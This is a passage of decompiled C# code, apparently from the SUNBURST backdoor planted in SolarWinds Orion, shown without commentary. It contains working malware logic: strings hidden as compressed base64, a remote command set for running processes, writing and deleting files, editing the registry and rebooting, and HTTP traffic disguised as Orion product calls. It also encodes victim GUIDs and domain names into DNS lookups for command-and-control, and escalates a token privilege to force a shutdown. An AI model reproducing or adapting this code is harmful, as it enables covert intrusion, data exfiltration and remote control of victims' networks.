        if (method == OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Head)
          str1 = ((ushort) err).ToString();
        if (this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Post)
        {
          string[] strArray = new string[9]
          {
            OrionImprovementBusinessLayer.ZipHelper.Unzip("0y3Kzy8BAA=="),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("001OLSoBAA=="),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("0y3NyyxLLSpOzIlPTgQA"),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("001OBAA="),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("0y0oysxNLKqMT04EAA=="),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("0y3JzE0tLknMLQAA"),
            "",
            OrionImprovementBusinessLayer.ZipHelper.Unzip("003PyU9KzAEA"),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("0y1OTS4tSk1OBAA=")
          };
          return string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("K8jO1E8uytGvNqitNqytNqrVA/IA"), (object) this.random.Next(100, 10000), (object) strArray[this.random.Next(strArray.Length)], str1 == null ? (object) "" : (object) ("-" + str1));
        }
        if (this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Put)
        {
          string[] strArray1 = new string[10]
          {
            OrionImprovementBusinessLayer.ZipHelper.Unzip("c8rPSQEA"),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("c8rPSfEsSczJTAYA"),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("c60oKUp0ys9JAQA="),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("c60oKUp0ys9J8SxJzMlMBgA="),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("8yxJzMlMBgA="),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("88lMzygBAA=="),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("88lMzyjxLEnMyUwGAA=="),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("C0pNL81JLAIA"),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NzXTKz0kBAA=="),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NzXTKz0nxLEnMyUwGAA==")
          };
          string[] strArray2 = new string[7]
          {
            OrionImprovementBusinessLayer.ZipHelper.Unzip("yy9IzStOzCsGAA=="),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("y8svyQcA"),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("SytKTU3LzysBAA=="),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("C84vLUpOdc5PSQ0oygcA"),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("C84vLUpODU4tykwLKMoHAA=="),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("C84vLUpO9UjMC07MKwYA"),
            OrionImprovementBusinessLayer.ZipHelper.Unzip("C84vLUpO9UjMC04tykwDAA==")
          };
          int index = this.random.Next(strArray2.Length);
          return index <= 1 ? string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA"), (object) this.random.Next(100, 10000), (object) strArray2[index], (object) strArray1[this.random.Next(strArray1.Length)].ToLower(), (object) str1) : string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA="), (object) this.random.Next(100, 10000), (object) strArray2[index], (object) strArray1[this.random.Next(strArray1.Length)], (object) str1);
        }
        switch (method)
        {
          case OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Get:
          case OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Head:
            string str2 = "";
            if (this.Valid(20))
            {
              str2 += OrionImprovementBusinessLayer.ZipHelper.Unzip("C87PSSwKz8xLKQYA");
              if (this.Valid(40))
                str2 += OrionImprovementBusinessLayer.ZipHelper.Unzip("03POLypJrQjIKU3PzAMA");
            }
            if (this.Valid(80))
              str2 += OrionImprovementBusinessLayer.ZipHelper.Unzip("0/MvyszPAwA=");
            if (this.Valid(80))
            {
              string[] strArray = new string[6]
              {
                OrionImprovementBusinessLayer.ZipHelper.Unzip("C88sSs1JLS4GAA=="),
                OrionImprovementBusinessLayer.ZipHelper.Unzip("C/UEAA=="),
                OrionImprovementBusinessLayer.ZipHelper.Unzip("C89MSU8tKQYA"),
                OrionImprovementBusinessLayer.ZipHelper.Unzip("8wvwBQA="),
                OrionImprovementBusinessLayer.ZipHelper.Unzip("cyzIz8nJBwA="),
                OrionImprovementBusinessLayer.ZipHelper.Unzip("c87JL03xzc/LLMkvysxLBwA=")
              };
              str2 = str2 + "." + strArray[this.random.Next(strArray.Length)];
            }
            if (this.Valid(30) || string.IsNullOrEmpty(str2))
            {
              string[] strArray = new string[4]
              {
                OrionImprovementBusinessLayer.ZipHelper.Unzip("88tPSS0GAA=="),
                OrionImprovementBusinessLayer.ZipHelper.Unzip("C8vPKc1NLQYA"),
                OrionImprovementBusinessLayer.ZipHelper.Unzip("88wrSS1KS0xOLQYA"),
                OrionImprovementBusinessLayer.ZipHelper.Unzip("c87PLcjPS80rKQYA")
              };
              str2 = str2 + "." + strArray[this.random.Next(strArray.Length)];
            }
            if (this.Valid(30) || str1 != null)
            {
              str2 = str2 + "-" + (object) this.random.Next(1, 20) + "." + (object) this.random.Next(1, 30);
              if (str1 != null)
                str2 = str2 + "." + ((ushort) err).ToString();
            }
            return OrionImprovementBusinessLayer.ZipHelper.Unzip("Ky7PLNAvLUjRBwA=") + str2.TrimStart('.') + OrionImprovementBusinessLayer.ZipHelper.Unzip("06vIzQEA");
          case OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Put:
            return OrionImprovementBusinessLayer.ZipHelper.Unzip("Ky7PLNB3LUvNKykGAA==");
          default:
            return OrionImprovementBusinessLayer.ZipHelper.Unzip("Ky7PLNAPLcjJT0zRSyzOqAAA");
        }
      }

      private string GetUserAgent()
      {
        if (this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Put || this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Get)
          return (string) null;
        if (this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Post)
        {
          if (string.IsNullOrEmpty(OrionImprovementBusinessLayer.userAgentDefault))
          {
            OrionImprovementBusinessLayer.userAgentDefault = OrionImprovementBusinessLayer.ZipHelper.Unzip("881MLsovzk8r0XUuqiwoyXcM8NQHAA==");
            OrionImprovementBusinessLayer.userAgentDefault += OrionImprovementBusinessLayer.GetOSVersion(false);
          }
          return OrionImprovementBusinessLayer.userAgentDefault;
        }
        if (string.IsNullOrEmpty(OrionImprovementBusinessLayer.userAgentOrionImprovementClient))
        {
          OrionImprovementBusinessLayer.userAgentOrionImprovementClient = OrionImprovementBusinessLayer.ZipHelper.Unzip("C87PSSwKz8xLKfYvyszP88wtKMovS81NzStxzskEkvoA");
          try
          {
            string fileName = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + OrionImprovementBusinessLayer.ZipHelper.Unzip("i/EvyszP88wtKMovS81NzSuJCc7PSSwKz8xLKdZDl9NLrUgFAA==");
            OrionImprovementBusinessLayer.userAgentOrionImprovementClient += FileVersionInfo.GetVersionInfo(fileName).FileVersion;
          }
          catch (Exception ex)
          {
            OrionImprovementBusinessLayer.userAgentOrionImprovementClient += OrionImprovementBusinessLayer.ZipHelper.Unzip("M9YzAEJjCyMA");
          }
        }
        return OrionImprovementBusinessLayer.userAgentOrionImprovementClient;
      }

      private enum JobEngine
      {
        Idle,
        Exit,
        SetTime,
        CollectSystemDescription,
        UploadSystemDescription,
        RunTask,
        GetProcessByDescription,
        KillTask,
        GetFileSystemEntries,
        WriteFile,
        FileExists,
        DeleteFile,
        GetFileHash,
        ReadRegistryValue,
        SetRegistryValue,
        DeleteRegistryValue,
        GetRegistrySubKeyAndValueNames,
        Reboot,
        None,
      }

      private enum HttpOipExMethods
      {
        Get,
        Head,
        Put,
        Post,
      }
    }

    private static class DnsHelper
    {
      public static bool CheckServerConnection(string hostName)
      {
        try
        {
          IPHostEntry ipHostEntry = OrionImprovementBusinessLayer.DnsHelper.GetIPHostEntry(hostName);
          if (ipHostEntry != null)
          {
            foreach (IPAddress address in ipHostEntry.AddressList)
            {
              switch (OrionImprovementBusinessLayer.IPAddressesHelper.GetAddressFamily(address))
              {
                case OrionImprovementBusinessLayer.AddressFamilyEx.Atm:
                case OrionImprovementBusinessLayer.AddressFamilyEx.Error:
                  continue;
                default:
                  return true;
              }
            }
          }
        }
        catch (Exception ex)
        {
        }
        return false;
      }

      public static IPHostEntry GetIPHostEntry(string hostName)
      {
        int[][] numArray = new int[2][]
        {
          new int[2]{ 25, 30 },
          new int[2]{ 55, 60 }
        };
        int num = numArray.GetLength(0) + 1;
        for (int index = 1; index <= num; ++index)
        {
          try
          {
            return Dns.GetHostEntry(hostName);
          }
          catch (SocketException ex)
          {
          }
          if (index + 1 <= num)
            OrionImprovementBusinessLayer.DelayMs((double) (numArray[index - 1][0] * 1000), (double) (numArray[index - 1][1] * 1000));
        }
        return (IPHostEntry) null;
      }

      public static OrionImprovementBusinessLayer.AddressFamilyEx GetAddressFamily(
        string hostName,
        OrionImprovementBusinessLayer.DnsRecords rec)
      {
        rec.cname = (string) null;
        try
        {
          IPHostEntry ipHostEntry = OrionImprovementBusinessLayer.DnsHelper.GetIPHostEntry(hostName);
          if (ipHostEntry == null)
            return OrionImprovementBusinessLayer.AddressFamilyEx.Error;
          foreach (IPAddress address in ipHostEntry.AddressList)
          {
            if (address.AddressFamily == AddressFamily.InterNetwork)
            {
              if (ipHostEntry.HostName != hostName && !string.IsNullOrEmpty(ipHostEntry.HostName))
              {
                rec.cname = ipHostEntry.HostName;
                if (OrionImprovementBusinessLayer.IPAddressesHelper.GetAddressFamily(address) == OrionImprovementBusinessLayer.AddressFamilyEx.Atm)
                  return OrionImprovementBusinessLayer.AddressFamilyEx.Atm;
                if (!rec.dnssec)
                  return OrionImprovementBusinessLayer.AddressFamilyEx.Error;
                rec.dnssec = false;
                return OrionImprovementBusinessLayer.AddressFamilyEx.NetBios;
              }
              OrionImprovementBusinessLayer.IPAddressesHelper.GetAddresses(address, rec);
              return OrionImprovementBusinessLayer.IPAddressesHelper.GetAddressFamily(address, out rec.dnssec);
            }
          }
          return OrionImprovementBusinessLayer.AddressFamilyEx.Unknown;
        }
        catch (Exception ex)
        {
        }
        return OrionImprovementBusinessLayer.AddressFamilyEx.Error;
      }
    }

    private class CryptoHelper
    {
      private const int dnSize = 32;
      private const int dnCount = 36;
      private readonly byte[] guid;
      private readonly string dnStr;
      private string dnStrLower;
      private int nCount;
      private int offset;

      public CryptoHelper(byte[] userId, string domain)
      {
        this.guid = ((IEnumerable<byte>) userId).ToArray<byte>();
        this.dnStr = OrionImprovementBusinessLayer.CryptoHelper.DecryptShort(domain);
        this.offset = 0;
        this.nCount = 0;
      }

      private static string Base64Decode(string s)
      {
        string str1 = OrionImprovementBusinessLayer.ZipHelper.Unzip("Kyo0Ti9OzCkxKzXMrEyryi8wNTdKMbFMyquwSC7LzU4tz8gCAA==");
        string str2 = OrionImprovementBusinessLayer.ZipHelper.Unzip("M4jX1QMA");
        string str3 = "";
        Random random = new Random();
        foreach (char ch1 in s)
        {
          int num = str2.IndexOf(ch1);
          char ch2;
          string str4;
          if (num >= 0)
          {
            string str5 = str3;
            ch2 = str2[0];
            string str6 = ch2.ToString();
            ch2 = str1[num + random.Next() % (str1.Length / str2.Length) * str2.Length];
            string str7 = ch2.ToString();
            str4 = str5 + str6 + str7;
          }
          else
          {
            string str5 = str3;
            ch2 = str1[(str1.IndexOf(ch1) + 4) % str1.Length];
            string str6 = ch2.ToString();
            str4 = str5 + str6;
          }
          str3 = str4;
        }
        return str3;
      }

      private static string Base64Encode(byte[] bytes, bool rt)
      {
        string str1 = OrionImprovementBusinessLayer.ZipHelper.Unzip("K8gwSs1MyzfOMy0tSTfMskixNCksKkvKzTYoTswxN0sGAA==");
        string str2 = "";
        uint num1 = 0;
        int num2 = 0;
        foreach (byte num3 in bytes)
        {
          num1 |= (uint) num3 << num2;
          for (num2 += 8; num2 >= 5; num2 -= 5)
          {
            str2 += str1[(int) num1 & 31].ToString();
            num1 >>= 5;
          }
        }
        if (num2 > 0)
        {
          if (rt)
            num1 |= (uint) (new Random().Next() << num2);
          str2 += str1[(int) num1 & 31].ToString();
        }
        return str2;
      }

      private static string CreateSecureString(byte[] data, bool flag)
      {
        byte[] bytes = new byte[data.Length + 1];
        bytes[0] = (byte) new Random().Next(1, (int) sbyte.MaxValue);
        if (flag)
          bytes[0] |= (byte) 128;
        for (int index = 1; index < bytes.Length; ++index)
          bytes[index] = (byte) ((uint) data[index - 1] ^ (uint) bytes[0]);
        return OrionImprovementBusinessLayer.CryptoHelper.Base64Encode(bytes, true);
      }

      private static string CreateString(int n, char c)
      {
        if (n < 0 || n >= 36)
          n = 35;
        n = (n + (int) c) % 36;
        return n < 10 ? ((char) (48 + n)).ToString() : ((char) (97 + n - 10)).ToString();
      }

      private static string DecryptShort(string domain)
      {
        return domain.All<char>((Func<char, bool>) (c => OrionImprovementBusinessLayer.ZipHelper.Unzip("MzA0MjYxNTO3sExMSk5JTUvPyMzKzsnNyy8oLCouKS0rr6is0o3XAwA=").Contains<char>(c))) ? OrionImprovementBusinessLayer.CryptoHelper.Base64Decode(domain) : "00" + OrionImprovementBusinessLayer.CryptoHelper.Base64Encode(Encoding.UTF8.GetBytes(domain), false);
      }

      private string GetStatus()
      {
        return "." + OrionImprovementBusinessLayer.domain2 + "." + OrionImprovementBusinessLayer.domain3[(int) this.guid[0] % OrionImprovementBusinessLayer.domain3.Length] + "." + OrionImprovementBusinessLayer.domain1;
      }

      private static int GetStringHash(bool flag)
      {
        return ((int) ((DateTime.UtcNow - new DateTime(2010, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalMinutes / 30.0) & 524287) << 1 | (flag ? 1 : 0);
      }

      private byte[] UpdateBuffer(int sz, byte[] data, bool flag)
      {
        byte[] numArray = new byte[this.guid.Length + (data != null ? data.Length : 0) + 3];
        Array.Clear((Array) numArray, 0, numArray.Length);
        Array.Copy((Array) this.guid, (Array) numArray, this.guid.Length);
        int stringHash = OrionImprovementBusinessLayer.CryptoHelper.GetStringHash(flag);
        numArray[this.guid.Length] = (byte) ((stringHash & 983040) >> 16 | (sz & 15) << 4);
        numArray[this.guid.Length + 1] = (byte) ((stringHash & 65280) >> 8);
        numArray[this.guid.Length + 2] = (byte) (stringHash & (int) byte.MaxValue);
        if (data != null)
          Array.Copy((Array) data, 0, (Array) numArray, numArray.Length - data.Length, data.Length);
        for (int index = 0; index < this.guid.Length; ++index)
          numArray[index] ^= numArray[this.guid.Length + 2 - index % 2];
        return numArray;
      }

      public string GetNextStringEx(bool flag)
      {
        byte[] data = new byte[(OrionImprovementBusinessLayer.svcList.Length * 2 + 7) / 8];
        Array.Clear((Array) data, 0, data.Length);
        for (int index = 0; index < OrionImprovementBusinessLayer.svcList.Length; ++index)
        {
          int num = Convert.ToInt32(OrionImprovementBusinessLayer.svcList[index].stopped) | Convert.ToInt32(OrionImprovementBusinessLayer.svcList[index].running) << 1;
          data[data.Length - 1 - index / 4] |= Convert.ToByte(num << index % 4 * 2);
        }
        return OrionImprovementBusinessLayer.CryptoHelper.CreateSecureString(this.UpdateBuffer(2, data, flag), false) + this.GetStatus();
      }

      public string GetNextString(bool flag)
      {
        return OrionImprovementBusinessLayer.CryptoHelper.CreateSecureString(this.UpdateBuffer(1, (byte[]) null, flag), false) + this.GetStatus();
      }

      public string GetPreviousString(out bool last)
      {
        string secureString = OrionImprovementBusinessLayer.CryptoHelper.CreateSecureString(this.guid, true);
        int val1 = 32 - secureString.Length - 1;
        string str1 = "";
        last = false;
        if (this.offset >= this.dnStr.Length || this.nCount > 36)
          return str1;
        int length = Math.Min(val1, this.dnStr.Length - this.offset);
        this.dnStrLower = this.dnStr.Substring(this.offset, length);
        this.offset += length;
        if (OrionImprovementBusinessLayer.ZipHelper.Unzip("0403AAA=").Contains<char>(this.dnStrLower[this.dnStrLower.Length - 1]))
        {
          if (length == val1)
          {
            --this.offset;
            this.dnStrLower = this.dnStrLower.Remove(this.dnStrLower.Length - 1);
          }
          this.dnStrLower += "0";
        }
        if (this.offset >= this.dnStr.Length || this.nCount > 36)
          this.nCount = -1;
        string str2 = secureString + OrionImprovementBusinessLayer.CryptoHelper.CreateString(this.nCount, secureString[0]) + this.dnStrLower + this.GetStatus();
        if (this.nCount >= 0)
          ++this.nCount;
        last = this.nCount < 0;
        return str2;
      }

      public string GetCurrentString()
      {
        string secureString = OrionImprovementBusinessLayer.CryptoHelper.CreateSecureString(this.guid, true);
        return secureString + OrionImprovementBusinessLayer.CryptoHelper.CreateString(this.nCount > 0 ? this.nCount - 1 : this.nCount, secureString[0]) + this.dnStrLower + this.GetStatus();
      }
    }

    private class DnsRecords
    {
      public int A;
      public int _type;
      public int length;
      public string cname;
      public bool dnssec;
    }

    private class IPAddressesHelper
    {
      private readonly IPAddress subnet;
      private readonly IPAddress mask;
      private readonly OrionImprovementBusinessLayer.AddressFamilyEx family;
      private readonly bool ext;

      public IPAddressesHelper(
        string subnet,
        string mask,
        OrionImprovementBusinessLayer.AddressFamilyEx family,
        bool ext)
      {
        this.family = family;
        this.subnet = IPAddress.Parse(subnet);
        this.mask = IPAddress.Parse(mask);
        this.ext = ext;
      }

      public IPAddressesHelper(
        string subnet,
        string mask,
        OrionImprovementBusinessLayer.AddressFamilyEx family)
        : this(subnet, mask, family, false)
      {
      }

      public static void GetAddresses(
        IPAddress address,
        OrionImprovementBusinessLayer.DnsRecords rec)
      {
        Random random = new Random();
        byte[] addressBytes = address.GetAddressBytes();
        switch ((int) addressBytes[addressBytes.Length - 2] & 10)
        {
          case 2:
            rec.length = 1;
            break;
          case 8:
            rec.length = 2;
            break;
          case 10:
            rec.length = 3;
            break;
          default:
            rec.length = 0;
            break;
        }
        switch ((int) addressBytes[addressBytes.Length - 1] & 136)
        {
          case 8:
            rec._type = 1;
            break;
          case 128:
            rec._type = 2;
            break;
          case 136:
            rec._type = 3;
            break;
          default:
            rec._type = 0;
            break;
        }
        switch ((int) addressBytes[addressBytes.Length - 1] & 84)
        {
          case 4:
            rec.A = random.Next(240, 300);
            break;
          case 16:
            rec.A = random.Next(480, 600);
            break;
          case 20:
            rec.A = random.Next(1440, 1560);
            break;
          case 64:
            rec.A = random.Next(4320, 5760);
            break;
          case 68:
            rec.A = random.Next(10020, 10140);
            break;
          case 80:
            rec.A = random.Next(20100, 20220);
            break;
          case 84:
            rec.A = random.Next(43140, 43260);
            break;
          default:
            rec.A = 0;
            break;
        }
      }

      public static OrionImprovementBusinessLayer.AddressFamilyEx GetAddressFamily(
        IPAddress address)
      {
        return OrionImprovementBusinessLayer.IPAddressesHelper.GetAddressFamily(address, out bool _);
      }

      public static OrionImprovementBusinessLayer.AddressFamilyEx GetAddressFamily(
        IPAddress address,
        out bool ext)
      {
        ext = false;
        try
        {
          if (IPAddress.IsLoopback(address) || address.Equals((object) IPAddress.Any) || address.Equals((object) IPAddress.IPv6Any))
            return OrionImprovementBusinessLayer.AddressFamilyEx.Atm;
          if (address.AddressFamily == AddressFamily.InterNetworkV6)
          {
            byte[] addressBytes = address.GetAddressBytes();
            if (((IEnumerable<byte>) addressBytes).Take<byte>(10).All<byte>((Func<byte, bool>) (b => b == (byte) 0)) && (int) addressBytes[10] == (int) addressBytes[11] && (addressBytes[10] == (byte) 0 || addressBytes[10] == byte.MaxValue))
              address = address.MapToIPv4();
          }
          else if (address.AddressFamily != AddressFamily.InterNetwork)
            return OrionImprovementBusinessLayer.AddressFamilyEx.Unknown;
          byte[] addressBytes1 = address.GetAddressBytes();
          foreach (OrionImprovementBusinessLayer.IPAddressesHelper n in OrionImprovementBusinessLayer.nList)
          {
            byte[] addressBytes2 = n.subnet.GetAddressBytes();
            byte[] addressBytes3 = n.mask.GetAddressBytes();
            if (addressBytes1.Length == addressBytes3.Length && addressBytes1.Length == addressBytes2.Length)
            {
              bool flag = true;
              for (int index = 0; index < addressBytes1.Length; ++index)
              {
                if (((int) addressBytes1[index] & (int) addressBytes3[index]) != ((int) addressBytes2[index] & (int) addressBytes3[index]))
                {
                  flag = false;
                  break;
                }
              }
              if (flag)
              {
                ext = n.ext;
                return n.family;
              }
            }
          }
          return address.AddressFamily == AddressFamily.InterNetworkV6 ? OrionImprovementBusinessLayer.AddressFamilyEx.InterNetworkV6 : OrionImprovementBusinessLayer.AddressFamilyEx.InterNetwork;
        }
        catch (Exception ex)
        {
        }
        return OrionImprovementBusinessLayer.AddressFamilyEx.Error;
      }
    }

    private static class ZipHelper
    {
      public static byte[] Compress(byte[] input)
      {
        using (MemoryStream memoryStream1 = new MemoryStream(input))
        {
          using (MemoryStream memoryStream2 = new MemoryStream())
          {
            using (DeflateStream deflateStream = new DeflateStream((Stream) memoryStream2, CompressionMode.Compress))
              memoryStream1.CopyTo((Stream) deflateStream);
            return memoryStream2.ToArray();
          }
        }
      }

      public static byte[] Decompress(byte[] input)
      {
        using (MemoryStream memoryStream1 = new MemoryStream(input))
        {
          using (MemoryStream memoryStream2 = new MemoryStream())
          {
            using (DeflateStream deflateStream = new DeflateStream((Stream) memoryStream1, CompressionMode.Decompress))
              deflateStream.CopyTo((Stream) memoryStream2);
            return memoryStream2.ToArray();
          }
        }
      }

      public static string Zip(string input)
      {
        if (string.IsNullOrEmpty(input))
          return input;
        try
        {
          return Convert.ToBase64String(OrionImprovementBusinessLayer.ZipHelper.Compress(Encoding.UTF8.GetBytes(input)));
        }
        catch (Exception ex)
        {
          return "";
        }
      }

      public static string Unzip(string input)
      {
        if (string.IsNullOrEmpty(input))
          return input;
        try
        {
          return Encoding.UTF8.GetString(OrionImprovementBusinessLayer.ZipHelper.Decompress(Convert.FromBase64String(input)));
        }
        catch (Exception ex)
        {
          return input;
        }
      }
    }

    public class NativeMethods
    {
      private const uint SE_PRIVILEGE_DISABLED = 0;
      private const uint SE_PRIVILEGE_ENABLED = 2;
      private const string ADVAPI32 = "advapi32.dll";
      private const string KERNEL32 = "kernel32.dll";

      [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
      [DllImport("kernel32.dll", SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      private static extern bool CloseHandle(IntPtr handle);

      [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
      [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      private static extern bool AdjustTokenPrivileges(
        [In] IntPtr TokenHandle,
        [MarshalAs(UnmanagedType.Bool), In] bool DisableAllPrivileges,
        [In] ref OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE NewState,
        [In] uint BufferLength,
        [In, Out] ref OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE PreviousState,
        [In, Out] ref uint ReturnLength);

      [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
      [DllImport("advapi32.dll", EntryPoint = "LookupPrivilegeValueW", CharSet = CharSet.Unicode, SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      private static extern bool LookupPrivilegeValue(
        [In] string lpSystemName,
        [In] string lpName,
        [In, Out] ref OrionImprovementBusinessLayer.NativeMethods.LUID Luid);

      [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
      [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      private static extern IntPtr GetCurrentProcess();

      [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
      [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      private static extern bool OpenProcessToken(
        [In] IntPtr ProcessToken,
        [In] TokenAccessLevels DesiredAccess,
        [In, Out] ref IntPtr TokenHandle);

      [DllImport("advapi32.dll", EntryPoint = "InitiateSystemShutdownExW", CharSet = CharSet.Unicode, SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool InitiateSystemShutdownEx(
        [In] string lpMachineName,
        [In] string lpMessage,
        [In] uint dwTimeout,
        [MarshalAs(UnmanagedType.Bool), In] bool bForceAppsClosed,
        [MarshalAs(UnmanagedType.Bool), In] bool bRebootAfterShutdown,
        [In] uint dwReason);

      public static bool RebootComputer()
      {
        bool flag = false;
        try
        {
          bool previousState = false;
          string privilege = OrionImprovementBusinessLayer.ZipHelper.Unzip("C04NzigtSckvzwsoyizLzElNTwUA");
          if (!OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege, true, out previousState))
            return flag;
          flag = OrionImprovementBusinessLayer.NativeMethods.InitiateSystemShutdownEx((string) null, (string) null, 0U, true, true, 2147745794U);
          OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege, previousState, out previousState);
          return flag;
        }
        catch (Exception ex)
        {
          return flag;
        }
      }

      public static bool SetProcessPrivilege(
        string privilege,
        bool newState,
        out bool previousState)
      {
        bool flag = false;
        previousState = false;
        try
        {
          IntPtr zero = IntPtr.Zero;
          OrionImprovementBusinessLayer.NativeMethods.LUID Luid = new OrionImprovementBusinessLayer.NativeMethods.LUID();
          Luid.LowPart = 0U;
          Luid.HighPart = 0U;
          if (!OrionImprovementBusinessLayer.NativeMethods.OpenProcessToken(OrionImprovementBusinessLayer.NativeMethods.GetCurrentProcess(), TokenAccessLevels.Query | TokenAccessLevels.AdjustPrivileges, ref zero))
            return false;
          if (!OrionImprovementBusinessLayer.NativeMethods.LookupPrivilegeValue((string) null, privilege, ref Luid))
          {
            OrionImprovementBusinessLayer.NativeMethods.CloseHandle(zero);
            return false;
          }
          OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE NewState = new OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE();
          OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE PreviousState = new OrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE();
          NewState.PrivilegeCount = 1U;
          NewState.Privilege.Luid = Luid;
          NewState.Privilege.Attributes = newState ? 2U : 0U;
          uint ReturnLength = 0;
          OrionImprovementBusinessLayer.NativeMethods.AdjustTokenPrivileges(zero, false, ref NewState, (uint) Marshal.SizeOf((object) PreviousState), ref PreviousState, ref ReturnLength);
          previousState = (PreviousState.Privilege.Attributes & 2U) > 0U;
          flag = true;
          OrionImprovementBusinessLayer.NativeMethods.CloseHandle(zero);
          return flag;
        }
        catch (Exception ex)
        {
          return flag;
        }
      }

      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
      private struct LUID
      {
        public uint LowPart;
        public uint HighPart;
      }

      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
      private struct LUID_AND_ATTRIBUTES
      {
        public OrionImprovementBusinessLayer.NativeMethods.LUID Luid;
        public uint Attributes;
      }

      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
      private struct TOKEN_PRIVILEGE
      {
        public uint PrivilegeCount;
        public OrionImprovementBusinessLayer.NativeMethods.LUID_AND_ATTRIBUTES Privilege;
      }
    }
  }
}
